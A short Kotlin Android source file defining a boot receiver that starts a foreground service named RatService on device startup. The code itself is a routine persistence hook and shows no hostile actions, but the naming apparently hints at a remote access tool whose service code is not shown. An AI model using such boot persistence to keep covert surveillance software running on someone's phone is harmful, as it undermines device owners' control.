package com.ratio.ratapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val svc = Intent(context, RatService::class.java).apply {
            action = RatService.ACTION_START
        }
        ContextCompat.startForegroundService(context, svc)
    }
}